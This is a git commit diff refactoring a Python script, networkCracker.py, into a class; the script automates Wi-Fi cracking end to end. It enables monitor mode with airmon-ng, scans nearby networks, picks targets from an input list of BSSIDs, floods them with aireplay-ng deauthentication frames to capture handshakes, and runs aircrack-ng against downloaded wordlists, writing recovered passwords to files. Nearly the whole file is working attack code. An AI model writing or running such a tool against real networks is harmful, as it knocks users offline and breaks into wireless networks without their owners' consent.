369964d311180e64ce0243a1e2b55b97c75c32df
Can Tosun <48149373+Cantsnn@users.noreply.github.com>
2021-02-21 22:01:40 +0300

    class haline getirildi

--- networkCracker.py
+++ networkCracker.py
@@ -1,79 +1,107 @@
-#!/usr/bin/env python
-import os 
-import subprocess   
-from subprocess import check_call
-from scapy.all import *
-import sys, signal 
-from multiprocessing import Process
-import time
+import os
+import sys, signal
 import csv
 import pandas as pd
 
-if os.path.exists('output.txt'):
-  os.remove('output.txt')
+class networkCracker:
 
-if os.path.exists('myOutput-01.csv'):
-  os.remove('myOutput-01.csv')
-#interface adını 9-17. satırlarda alıyoruz
-os.system('airmon-ng >> output.txt')
-f = open('output.txt', 'r')
-i = 0
-for line in f:
-  for word in line.split():
-    i+=1
-    if i == 6:
-      interface = word
-      print(interface)
-order = "airmon-ng start {} && airmon-ng check kill".format(interface)
-geny  = os.system(order)
-os.system('airmon-ng >> output2.txt')
-f = open('output2.txt', 'r')
-i = 0
-for line in f:
-  for word in line.split():
-    i+=1
-    if i == 6:
-      interfacemon = word
-      print(interfacemon)
+	def __init__(self):
+		self.interface = ""
+		self.interfacemon ="" 
+		self.wordlist = "wordlist.txt"
+		self.scanWirelessCard()
+		self.startMonitorMode()
+		self.scanNetworks()
+		self.readNetworksFile()
+		self.stopMonitorMode()
 
-order = f"airodump-ng {interfacemon} -M -w myOutput --output-format csv & sleep 20; kill $!"
-geny = os.system(order)
-print("****************1***************************")
-in_file = pd.read_csv("input.csv")
-inputCSV = in_file.copy()
-print("****************5***************************")
-in_file1= pd.read_csv("myOutput-01.csv",sep=r'\s*,\s*',header=0, engine='python')
-outputCSV= in_file1.copy()
-print("****************6***************************")
-cmd  = os.system("clear")
-inBSSID = list(inputCSV["BSSID"])
-outBSSID = list(outputCSV["BSSID"])
-print("******************2*************************")
-print("outlist len ",len(outBSSID))
-print("*******************3************************")
-writer = []
-i = 1
-for item in outBSSID:
-    if item in inBSSID:   
-        filter = outputCSV["BSSID"]==item
-        ch = int(outputCSV[filter]["channel"])
-        print(item + " : ",ch)
-        print("***************4****************************")
-        writer.append([item,ch])
-        dist=10
-        scan = "catfile"
-        path = scan+"-0"+str(i)+".cap"
-        wordlist = "wordlist.txt"
-        order = "airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {} & sleep 2; kill $!".format(interfacemon,item,ch,scan,dist,item,interfacemon)
-        geny = os.system(order)
-        orders = ("aircrack-ng {} -w {}").format(path,wordlist)
-        genyy = os.system(orders)
-        i+=1
 
-    else: 
-      print(item," : bulunamadi")
+	def scanWirelessCard(self):
+		if os.path.exists('scanWCard.txt'):
+			os.remove("scanWCard.txt")
 
-with open('output2.csv', 'w', newline='') as file:
-  wr = csv.writer(file)
-  wr.writerow(writer)
-  
+
+		os.system('airmon-ng >> scanWCard.txt')
+		f = open('scanWCard.txt', 'r')
+		i = 0
+		for line in f:
+			for word in line.split():
+				i+=1
+				if i == 6:
+					self.interface = word
+
+	def startMonitorMode(self):	
+		if os.path.exists("scanMonitor.txt"):
+			os.remove("scanMonitor.txt")
+	
+		order = "airmon-ng start {} && airmon-ng check kill".format(self.interface)
+		geny  = os.system(order)
+		os.system('airmon-ng >> scanMonitor.txt')
+		f = open('scanMonitor.txt', 'r')
+		i = 0
+		for line in f:
+			for word in line.split():
+				i+=1
+				if i == 6:
+					self.interfacemon = word
+
+
+	def stopMonitorMode(self):
+		order = "airmon-ng stop {} && service networking start && service network-manager start".format(self.interfacemon)
+		geny = os.system(order)
+
+
+	def downloadWordlist(self):
+		if os.path.exists("/usr/share/wordlists/rockyou.txt") or os.path.exists(dir+"/Hob0Rules")==False:
+			cmd = os.system("git clone https://github.com/praetorian-inc/Hob0Rules")
+			sleep = os.system("sleep 3")
+		if os.path.exists(dir+"/turkce-wordlist")==False:
+			cmd = os.system("git clone https://github.com/utkusen/turkce-wordlist")
+
+	def scanNetworks(self):
+		if os.path.exists('networks-01.csv'):
+			os.remove('networks-01.csv')
+		order = f"airodump-ng {self.interfacemon} -M -w networks --output-format csv & sleep 20; kill $!"
+		geny = os.system(order)
+
+	def readNetworksFile(self):
+
+		in_file = pd.read_csv("input.csv")
+		inputCSV = in_file.copy()
+
+		in_file1= pd.read_csv("networks-01.csv",sep=r'\s*,\s*',header=0, engine='python')
+		outputCSV= in_file1.copy()
+
+		inBSSID = list(inputCSV["BSSID"])
+		outBSSID = list(outputCSV["BSSID"])
+		networksCHs = []
+		i = 1
+		for item in outBSSID:
+			if item in inBSSID:
+				filter = outputCSV["BSSID"]==item
+				ch = int(outputCSV[filter]["channel"])
+				networksCHs.append([item,ch])
+				dist = 10
+				scan = "catfile"
+				order = "airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {} & sleep 2; kill $!".format(self.interfacemon,item,ch,scan,dist,item,self.interfacemon)
+				geny = os.system(order)
+				cmd  = os.system("sleep 5")
+				if (os.path.exists("wordlist.txt") == False):
+					self.wordlist = os.getcwd()+"/turkce-wordlist/wordlist.txt"
+
+
+				path = scan+"-0"+str(i)+".cap"
+				orders = ("aircrack-ng {} -w {} 2>&1 | tee passwords{}.txt").format(path,self.wordlist,i)
+				genyy = os.system(orders)
+				i+=1
+		self.writeNetworkID(networksCHs);
+
+
+	def writeNetworkID(self,networksCHs):
+		with open('networkID.csv', 'w', newline='') as file:
+			wr = csv.writer(file)
+			wr.writerow(networksCHs)
+
+
+if __name__ == '__main__':
+	cracker = networkCracker()
